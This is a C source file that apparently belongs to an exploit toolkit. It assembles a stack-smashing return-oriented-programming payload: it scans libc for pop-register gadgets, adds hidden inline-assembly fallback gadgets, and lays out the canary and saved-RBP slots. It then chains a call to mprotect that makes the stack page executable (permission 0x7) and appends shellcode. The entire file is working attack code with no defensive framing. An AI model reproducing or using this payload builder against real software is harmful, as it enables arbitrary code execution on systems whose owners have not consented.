#define _GNU_SOURCE
#include <assert.h>
#include <dlfcn.h>	// for dlsym()
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "payload.h"
#include "strnstr.h"

void initload(PayloadPtr plp) {
	memset(plp, 0, sizeof(*plp));
	initShellcodeUnion(&plp->pl_scu);
} // initload()

ssize_t makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np) {
	size_t libc_size	= getpagesize() * 100; // Punt

	char s_libc_popRDI[]	= {0x5f, 0xc3, 0};
	char s_libc_popRSI[]	= {0x5e, 0xc3, 0};
	char s_libc_popRDX[]	= {0x5a, 0xc3, 0};

	Pointer	libc_popRDI	= strnstr(baseAddressesPtr->libc_base, s_libc_popRDI, libc_size);
	Pointer	libc_popRSI	= strnstr(baseAddressesPtr->libc_base, s_libc_popRSI, libc_size);
	Pointer	libc_popRDX	= strnstr(baseAddressesPtr->libc_base, s_libc_popRDX, libc_size);

	Pointer	libc_mprotect	= dlsym(RTLD_NEXT, "mprotect");

	// Offsets are relative to the payload
	baseAddressesPtr->buf_base = plp;

	memset(plp->pl_dst, 0, sizeof(plp->pl_dst));

	plp->pl_canary.o	= indirectToOffset(&plp->pl_canary, 'B', baseAddressesPtr);
	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B', baseAddressesPtr);
	plp->pl_popRDI.o	= libc_popRDI?pointerToOffset(libc_popRDI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRDI, 'P', baseAddressesPtr);
	plp->pl_stackPage.o	= pointerToOffset(baseAddressesPtr->stack_base, 'S', baseAddressesPtr);
	plp->pl_popRSI.o	= libc_popRDI?pointerToOffset(libc_popRSI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRSI, 'P', baseAddressesPtr);
	plp->pl_stackSize	= getpagesize();
	plp->pl_popRDX.o	= libc_popRDX?pointerToOffset(libc_popRDX, 'L', baseAddressesPtr):pointerToOffset(&&l_popRDX, 'P', baseAddressesPtr);
	plp->pl_permission	= 0x7;
	plp->pl_mprotect.o	= pointerToOffset(libc_mprotect, 'L', baseAddressesPtr);

	plp->pl_shellCode.o	= pointerToOffset(&plp->pl_scu, 'B', baseAddressesPtr);

	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
	int volatile v = 0;

	if (v) {
l_popRDI:	// Fallback gadget for "POP RDI"
		__asm__ ("pop %rdi");
		__asm__ ("ret");
	} // if

	if (v) {
l_popRSI:	// Fallback gadget for "POP RSI"
		__asm__ ("pop %rsi");
		__asm__ ("ret");
	} // if

	if (v) {
l_popRDX:	 // Fallback gadget for "POP RDX"
		__asm__ ("pop %rdx");
		__asm__ ("ret");
	} // if

	return makeShellcode(&plp->pl_scu.sc, p, np);
} // makeload()

void dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
	fprintf(stderr, "--------------------------------------------\n");
	fprintf(stderr, "%20s: %018p\n",	"pl_canary.p",		plp->pl_canary.p);
	fprintf(stderr, "%20s: %018p\n",	"pl_rbp.p",		plp->pl_rbp.p);

	fprintf(stderr, "%20s: %018p\n",	"pl_popRDI.p",		plp->pl_popRDI.p);
	fprintf(stderr, "%20s: %018p\n",	"pl_stackPage.p",	plp->pl_stackPage.p);
	fprintf(stderr, "%20s: %018p\n",	"pl_popRSI.p",		plp->pl_popRSI.p);
	fprintf(stderr, "%20s: %#tx\n",		"pl_stackSize",		plp->pl_stackSize);
	fprintf(stderr, "%20s: %018p\n",	"pl_popRDX.p",		plp->pl_popRDX.p);
	fprintf(stderr, "%20s: %#tx\n",		"pl_permission",	plp->pl_permission);
	fprintf(stderr, "%20s: %018p\n",	"pl_mprotect.p",	plp->pl_mprotect.p);
	
	fprintf(stderr, "%20s: %018p\n",	"pl_shellCode.p",	plp->pl_shellCode.p);

	dumpShellcode(&plp->pl_scu.sc);
	fprintf(stderr, "--------------------------------------------\n");
} // dumpload()
